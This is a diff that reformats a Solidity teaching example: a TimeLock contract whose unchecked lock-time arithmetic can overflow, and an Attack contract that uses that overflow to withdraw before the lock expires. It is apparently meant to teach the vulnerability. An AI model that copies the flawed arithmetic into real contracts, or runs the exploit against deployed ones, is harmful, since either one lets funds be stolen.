@@ -2,23 +2,26 @@
 pragma solidity 0.7.6;
 
 contract TimeLock {
-    mapping(address => uint) public balances;
-    mapping(address => uint) public lockTime;
+    mapping(address => uint256) public balances;
+    mapping(address => uint256) public lockTime;
 
     function deposit() external payable {
         balances[msg.sender] += msg.value;
         lockTime[msg.sender] = block.timestamp + 1 weeks;
     }
 
-    function increaseLockTime(uint _secondsToIncrease) public {
+    function increaseLockTime(uint256 _secondsToIncrease) public {
         lockTime[msg.sender] += _secondsToIncrease;
     }
 
     function withdraw() public {
         require(balances[msg.sender] > 0, "Insufficient funds");
-        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
+        require(
+            block.timestamp > lockTime[msg.sender],
+            "Lock time not expired"
+        );
 
-        uint amount = balances[msg.sender];
+        uint256 amount = balances[msg.sender];
         balances[msg.sender] = 0;
 
         (bool sent, ) = msg.sender.call{value: amount}("");
@@ -39,7 +42,7 @@ contract Attack {
         timeLock.deposit{value: msg.value}();
 
         timeLock.increaseLockTime(
-            type(uint).max + 1 - timeLock.lockTime(address(this))
+            type(uint256).max + 1 - timeLock.lockTime(address(this))
         );
         timeLock.withdraw();
     }
